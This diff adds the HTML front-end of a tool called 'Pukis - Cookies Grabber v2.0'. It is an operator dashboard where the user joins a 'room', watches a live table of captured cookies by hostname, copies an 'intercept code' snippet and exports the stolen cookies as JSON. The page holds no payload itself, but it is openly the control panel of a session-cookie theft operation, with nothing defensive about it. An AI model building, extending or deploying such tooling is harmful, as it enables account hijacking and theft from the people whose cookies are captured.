@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pukis - Cookies Grabber</title>
+    <link rel="stylesheet" href="style.css">
+    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@300;400;500;700&display=swap" rel="stylesheet">
+</head>
+<body>
+    <div class="container">
+        <!-- ASCII Art Header -->
+        <div class="ascii-header">
+            <pre id="ascii-art">
+ ██████╗ ██╗   ██╗██╗  ██╗██╗███████╗
+ ██╔══██╗██║   ██║██║ ██╔╝██║██╔════╝
+ ██████╔╝██║   ██║█████╔╝ ██║███████╗
+ ██╔═══╝ ██║   ██║██╔═██╗ ██║╚════██║
+ ██║     ╚██████╔╝██║  ██╗██║███████║
+ ╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝╚══════╝
+            </pre>
+            <div class="subtitle">[ COOKIES GRABBER v2.0 ]</div>
+            <div class="status-line">
+                <span class="status-indicator">●</span>
+                <span id="connection-status">DISCONNECTED</span>
+            </div>
+        </div>
+
+        <!-- Room ID Input Section -->
+        <div id="login-section" class="section">
+            <div class="terminal-window">
+                <div class="terminal-header">
+                    <div class="terminal-buttons">
+                        <span class="btn-close"></span>
+                        <span class="btn-minimize"></span>
+                        <span class="btn-maximize"></span>
+                    </div>
+                    <div class="terminal-title">root@pukis:~#</div>
+                </div>
+                <div class="terminal-body">
+                    <div class="prompt-line">
+                        <span class="prompt">root@pukis:~$</span>
+                        <span class="command">./connect --room-id</span>
+                    </div>
+                    <form id="room-form">
+                        <div class="input-group">
+                            <label for="room-id">ENTER ROOM ID:</label>
+                            <input type="text" id="room-id" placeholder="room_12345" required>
+                            <button type="submit" class="hack-btn">
+                                <span class="btn-text">CONNECT</span>
+                                <span class="btn-loading">CONNECTING...</span>
+                            </button>
+                        </div>
+                    </form>
+                    <div id="error-message" class="error-msg"></div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Cookies Table Section -->
+        <div id="cookies-section" class="section hidden">
+            <div class="terminal-window">
+                <div class="terminal-header">
+                    <div class="terminal-buttons">
+                        <span class="btn-close"></span>
+                        <span class="btn-minimize"></span>
+                        <span class="btn-maximize"></span>
+                    </div>
+                    <div class="terminal-title">root@pukis:~# monitoring room: <span id="current-room"></span></div>
+                </div>
+                <div class="terminal-body">
+                    <div class="stats-bar">
+                        <div class="stat">
+                            <span class="stat-label">TOTAL COOKIES:</span>
+                            <span id="total-cookies" class="stat-value">0</span>
+                        </div>
+                        <div class="stat">
+                            <span class="stat-label">ACTIVE SESSIONS:</span>
+                            <span id="active-sessions" class="stat-value">0</span>
+                        </div>
+                        <div class="stat">
+                            <span class="stat-label">LAST UPDATE:</span>
+                            <span id="last-update" class="stat-value">--:--:--</span>
+                        </div>
+                        <div class="stat">
+                            <span class="stat-label">INTERCEPT CODE:</span>
+                            <button id="copy-intercept-btn" class="intercept-btn" title="Copy intercept code">
+                                COPY CODE
+                            </button>
+                        </div>
+                    </div>
+                    
+                    <div class="table-container">
+                        <table id="cookies-table">
+                            <thead>
+                                <tr>
+                                    <th>HOSTNAME</th>
+                                    <th>TIMESTAMP</th>
+                                    <th>COOKIES</th>
+                                    <th>ACTIONS</th>
+                                </tr>
+                            </thead>
+                            <tbody id="cookies-tbody">
+                                <!-- Dynamic content will be inserted here -->
+                            </tbody>
+                        </table>
+                    </div>
+                    
+                    <div class="controls">
+                        <button id="clear-btn" class="hack-btn danger">CLEAR ALL</button>
+                        <button id="export-btn" class="hack-btn">EXPORT JSON</button>
+                        <button id="disconnect-btn" class="hack-btn warning">DISCONNECT</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Loading Overlay -->
+        <div id="loading-overlay" class="loading-overlay hidden">
+            <div class="loading-content">
+                <div class="loading-spinner"></div>
+                <div class="loading-text">ESTABLISHING SECURE CONNECTION...</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Copy Toast Notification -->
+    <div id="copy-toast" class="toast hidden">
+        <span class="toast-icon">✓</span>
+        <span class="toast-text">Cookies copied to clipboard!</span>
+    </div>
+
+    <script src="/socket.io/socket.io.js"></script>
+    <script src="script.js"></script>
+</body>
+</html>
